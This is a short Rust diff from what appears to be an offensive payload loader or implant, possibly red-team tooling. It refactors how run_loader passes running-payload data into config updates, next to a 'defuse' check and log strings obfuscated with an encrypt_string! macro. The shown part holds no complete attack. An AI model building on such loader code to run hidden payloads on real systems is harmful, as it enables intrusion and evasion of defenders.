@@ -126,13 +126,16 @@ pub fn run_loader() {
 
             info!("{}", encrypt_string!("[+] UPDATE config"));
             //TODO si on file une copie
+            /* 
             let mut running_payload: Vec<Payload> = vec![];
             for t in &run_data.running_thread_payload {
                 running_payload.push(t.1.clone());
             }
+            */
+            let run_data_copy: RunData =  run_data.clone();
 
             //TODO lui filer une copie du run data plutôt, mais pas prioritaire. comme ça il pourra aussi avoir les decoy qui run
-            config = config.update_config(&session_id, &running_payload);
+            config = config.update_config(&session_id, &run_data_copy);
             info!("{}", encrypt_string!("[+] DEFUSE payload exec"));
             if config.stop_defuse(&config.defuse_payload) {
                 error!("{}", encrypt_string!("[!] DEFUSE STOP the payload exec"));
